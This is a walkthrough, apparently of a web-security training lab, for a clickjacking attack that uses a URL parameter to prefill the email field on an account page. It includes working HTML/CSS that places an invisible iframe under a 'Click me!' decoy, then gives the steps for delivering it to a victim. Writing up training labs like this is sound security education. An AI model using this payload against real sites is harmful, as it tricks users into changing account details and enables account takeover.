First, login as the `wiener` user. On the account page, *inspect* the Email input box and you'll see that the *name* is **email**. So, we can pass the **email** as prefilled input parameter to the url in the GET request via our custom iframe. Next, click on `Go to exploit server`. Paste the following code.

```
<br>
<style>
   #iframeBlock {
       position:relative;
       width:700;
       height: 500;
       opacity: 0.0;
       z-index: 2;
   }
   #divBlock {
       position:absolute;
       color:green;
       top:465;
       left:80;
       z-index: 1;
   }
</style>
<div id="divBlock">Click me!</div>
<iframe id="iframeBlock" src="https://ac041fe11e026d648025e96b00750096.web-security-academy.net/my-account?email=a@bc.net"></iframe>
```

**Note**:- Here, you can see the `email` parameter was added to the url so as to prefill the target email input box.

Next, click on `View exploit`. Note, you may have to increase the `opacity` of the **iframeBlock** so that you can see the target page behind our exploit page. You'll see that the Email input box is already prefilled as per our iframe src. Next go back to the exploit server, align the `Click me!` div if its not already aligned for you. Then, click on `Deliver exploit to victim` and the lab will be solved!
